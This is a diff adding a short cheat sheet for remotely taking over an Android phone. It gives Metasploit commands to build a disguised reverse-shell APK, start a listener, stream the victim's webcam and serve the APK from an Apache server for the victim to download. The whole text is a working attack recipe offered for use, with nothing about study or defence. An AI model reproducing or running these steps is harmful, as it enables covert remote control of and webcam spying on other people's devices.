@@ -1,0 +1,24 @@
+      Remote Android
+$ msfvenom -p android/meterpreter/reverse_tcp LHOST=[pc ip] LPORT=4444 R> /root/Desktop/check.apk
+$ msfconsole
+$ use exploit/multi/handler
+$ set payload android/meterpreter/reverse_tcp 
+$ set lhost [ip]
+$ set lport 4444
+$ exploit 
+              Hacked
+$ help [for commands]
+$ webcam_stream [for exam]
+
+
+         Make downloable apk
+$ cd /root
+$ cd Desktop
+$ cp check.apk /var/www/html
+$ cd /var/www/html
+$ ls
+$ rm wow.apk
+$ rm index.html
+$ ls
+$ service apache2 start
+   victim open ip [computer's ip]
